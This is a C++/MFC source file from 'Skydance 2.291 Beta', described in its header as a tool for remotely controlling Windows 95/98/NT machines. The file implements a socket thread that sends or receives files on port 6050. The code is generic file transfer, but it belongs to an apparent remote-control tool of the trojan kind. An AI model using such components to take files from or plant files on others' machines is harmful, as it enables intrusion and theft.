/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
// SkyThread.cpp: Implementierungsdatei
//
#include "stdafx.h"
#include "Skydance.h"
#include "SkyThread.h"
#include "SkySocket.h"
#include "DlgFtpStatus.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSkyThread
IMPLEMENT_DYNCREATE(CSkyThread, CWinThread)

CSkySocket *m_cAcceptSocket[40];//, hAcceptSocket;//wert später noch ändern!
CSkySocket *m_cSkySocket[40];//

CSkyThread::CSkyThread()
{
	m_bTransferBreak = FALSE;	//thread witerlaufen lassen!
	m_dwBytesWritten = 0;
	m_dwPos = 0;
	m_bUpDown = TRUE;
	m_bSCway = TRUE;
	m_sActiveIP = "127.0.0.1";
	m_iFtpPort = 6050;
	m_sFileName = "Unknown.sky";
	m_sFileNameServer = "Unkown.sky";
	m_pDialog = NULL;
	m_iCurrentBytes = 0;
	m_iNextFtpStatNr = 15;		//irgendwas... egal hier
}

CSkyThread::~CSkyThread()
{
}

void CSkyThread::SocketThreadInit()
{
	#ifndef _AFXDLL
	#define _AFX_SOCK_THREAD_STATE AFX_MODULE_THREAD_STATE
	#define _afxSockThreadState AfxGetModuleThreadState()
		_AFX_SOCK_THREAD_STATE* pState = _afxSockThreadState;
		if (pState->m_pmapSocketHandle == NULL)
			pState->m_pmapSocketHandle = new CMapPtrToPtr;
		if (pState->m_pmapDeadSockets == NULL)
			pState->m_pmapDeadSockets = new CMapPtrToPtr;
		if (pState->m_plistSocketNotifications == NULL)
			pState->m_plistSocketNotifications = new CPtrList;

	#endif
}

BOOL CSkyThread::InitInstance()
{
	SocketThreadInit();//AntiBug!
	// ZU ERLEDIGEN:  Initialisierungen für jeden Thread hier durchführen
	m_cAcceptSocket[m_iNextFtpStatNr] = new CSkySocket(1);
	m_cSkySocket[m_iNextFtpStatNr] = new CSkySocket(1);
	
	m_cAcceptSocket[m_iNextFtpStatNr]->SetParent(this);
	m_cSkySocket[m_iNextFtpStatNr]->SetParent(this);
	/////////////////////////
	////Connect/Liste?
	//AfxMessageBox(m_sFileName);
	if(m_bSCway == TRUE)
	{
		m_cAcceptSocket[m_iNextFtpStatNr]->Create(m_iFtpPort);//m_iFtpPort);
		m_cAcceptSocket[m_iNextFtpStatNr]->Listen();
	}
	else
	{
		m_cSkySocket[m_iNextFtpStatNr]->Create();
		if (m_cSkySocket[m_iNextFtpStatNr]->Connect(m_sActiveIP,m_iFtpPort) == 0)	AfxMessageBox("Could not connect!");//CSocket, also warten.
		else
		{
			if(m_bUpDown == TRUE)
			{
				//AfxMessageBox("UpDown is true!");
				ReadFileNow(m_sFileName);
			}
		}	
	}
	//////////////////
	///return ...
	return TRUE;
}

int CSkyThread::ExitInstance()
{
	// ZU ERLEDIGEN:  Bereinigungen für jeden Thread hier durchführen
	CDlgFtpStatus *pFtpStatus = (CDlgFtpStatus*) m_pDialog;
	///		///
	CSingleLock sLock(&(pFtpStatus->m_mutex));	
		//pFtpStatus->m_sCurrentStat = "Done   ";
		pFtpStatus->m_sCancel = "&Done";
		pFtpStatus->m_bTransferDone = TRUE;
	sLock.Lock();
	m_bTransferBreak = FALSE;		//nur zur Vorsicht...
	///		///
	delete m_cAcceptSocket[m_iNextFtpStatNr];
	delete m_cSkySocket[m_iNextFtpStatNr];
	////
	return CWinThread::ExitInstance();
}

BEGIN_MESSAGE_MAP(CSkyThread, CWinThread)
	//{{AFX_MSG_MAP(CSkyThread)
		// HINWEIS - Der Klassen-Assistent fügt hier Zuordnungsmakros ein und entfernt diese.
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// Behandlungsroutinen für Nachrichten CSkyThread 

BOOL CSkyThread::OnIdle(LONG lCount) 
{
	// TODO: Speziellen Code hier einfügen und/oder Basisklasse aufrufen
//m_bTransferBreak = TRUE
	if (m_bTransferBreak == TRUE)
	{
		m_cAcceptSocket[m_iNextFtpStatNr]->Close();
		m_cSkySocket[m_iNextFtpStatNr]->Close();
		ExitInstance();
	}
	return CWinThread::OnIdle(lCount);
	//return TRUE;
}

void CSkyThread::OnAccept()	//sehr umständlich... !!! (->) geht mit accept nicht 
{
	CSkySocket h1SkySocket(1);
	int h2SkySocket;
	m_cAcceptSocket[m_iNextFtpStatNr]->Accept(h1SkySocket);
	h2SkySocket = h1SkySocket.Detach();
	m_cSkySocket[m_iNextFtpStatNr]->Attach(h2SkySocket);
	if(m_bUpDown == TRUE)
	{
		ReadFileNow(m_sFileName);
	}
}

void CSkyThread::OnReceive()
{
	DWORD nRead;
	char buff[4096];
	nRead = m_cSkySocket[m_iNextFtpStatNr]->Receive(buff, 4096); ////Grösse des buffers!
	if (nRead != SOCKET_ERROR)
	{
		WriteFileNow(m_sFileName, buff, (nRead));
	}
}

void CSkyThread::OnClose()
{
	ExitInstance();
}

void CSkyThread::OnSend()
{
}

int CSkyThread::ReadFileNow(CString fullName)
{
	DWORD dwBytesRead;
	char buff[12288];
	m_hFile = CreateFile (TEXT(fullName),       // Open One.txt.
		                GENERIC_READ,           // Open for reading
						0,                      // Do not share
			            NULL,                   // No security
				        OPEN_EXISTING,          // Existing file only
					    FILE_ATTRIBUTE_NORMAL,  // Normal file
						NULL);                  // No template file

	if (m_hFile == INVALID_HANDLE_VALUE)
	{
		AfxMessageBox("Could not open " + fullName);
		return 1;
	}

	do
	{
		if (m_bTransferBreak == TRUE)
		{
			CloseHandle (m_hFile);
			m_cAcceptSocket[m_iNextFtpStatNr]->Close();
			m_cSkySocket[m_iNextFtpStatNr]->Close();
			return 1;
		}
		if (ReadFile (m_hFile, buff, 4096, &dwBytesRead, NULL))
		{
			m_cSkySocket[m_iNextFtpStatNr]->Send(buff, dwBytesRead);
		}
		SetStatusValues((int)dwBytesRead);
	}
	while (dwBytesRead == 4096);
	CloseHandle (m_hFile);
	m_bTransferBreak = TRUE;	
	if (dwBytesRead < 4096)
	{
		m_cAcceptSocket[m_iNextFtpStatNr]->Close();
		m_cSkySocket[m_iNextFtpStatNr]->Close();
		//AfxMessageBox("FileTransfer done.");
		return 0;
	}
	else AfxMessageBox("Anything got wrong...");
	return 1;	
}

int CSkyThread::WriteFileNow(CString fullName, char buff[4096], DWORD nRead)
{
	m_hAppend = CreateFile (TEXT(fullName),       // Open Two.txt.
						GENERIC_WRITE,          // Open for writing
						0,                      // Do not share
						NULL,                   // No security
						OPEN_ALWAYS,            // Open or create
						FILE_ATTRIBUTE_NORMAL,  // Normal file
						NULL);                  // No template file

		if (m_hAppend == INVALID_HANDLE_VALUE)
		{
			AfxMessageBox("Could not open " + fullName);
			return 1;
		}
	m_dwPos = SetFilePointer (m_hAppend, 0, NULL, FILE_END);
	WriteFile (m_hAppend, buff, nRead, &m_dwBytesWritten, NULL);
	CloseHandle (m_hAppend);
	SetStatusValues((int)nRead);
/*	if (nRead < 4096)//62.180.173.219
	{
		m_cAcceptSocket[m_iNextFtpStatNr]->Close();
		m_cSkySocket[m_iNextFtpStatNr]->Close();
		//AfxMessageBox("FileTransfer done.");
		ExitInstance();
	}*/
	return 0;
}

void CSkyThread::SendError()
{
	m_cAcceptSocket[m_iNextFtpStatNr]->Close();
	m_cSkySocket[m_iNextFtpStatNr]->Close();
	AfxMessageBox("Error while sending, connection terminated!");
	ExitInstance();
}

void CSkyThread::ReceiveError()
{
	m_cAcceptSocket[m_iNextFtpStatNr]->Close();
	m_cSkySocket[m_iNextFtpStatNr]->Close();
	AfxMessageBox("Error while sending, connection terminated!");
	ExitInstance();
}

void CSkyThread::SetStatusValues(int iLastPacket)	//setzt den gegenwärtigen Status des Transfers.
{
	CDlgFtpStatus *pFtpStatus = (CDlgFtpStatus*) m_pDialog;
	char sCurrentBytes[13];
	m_iCurrentBytes = m_iCurrentBytes + iLastPacket;
	itoa(m_iCurrentBytes,sCurrentBytes,10);			//und in String kon
	///		///
	CSingleLock sLock(&(pFtpStatus->m_mutex));	
		pFtpStatus->m_sCurrentStat = sCurrentBytes;
	sLock.Lock();
	///		///
	return;
}
